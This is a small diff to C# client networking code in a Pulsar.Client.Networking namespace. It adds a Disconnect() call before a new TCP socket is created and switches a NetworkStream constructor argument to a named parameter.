@@ -230,6 +230,8 @@ namespace Pulsar.Client.Networking
             Socket handle = null;
             try
             {
+                Disconnect();
+
                 handle = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                 handle.NoDelay = true;
                 handle.SetKeepAliveEx(KEEP_ALIVE_INTERVAL, KEEP_ALIVE_TIME);
@@ -237,7 +239,7 @@ namespace Pulsar.Client.Networking
 
                 if (handle.Connected)
                 {
-                    var stream = new NetworkStream(handle, true);
+                    var stream = new NetworkStream(handle, ownsSocket: true);
                     AttachStream(stream);
                 }
                 else
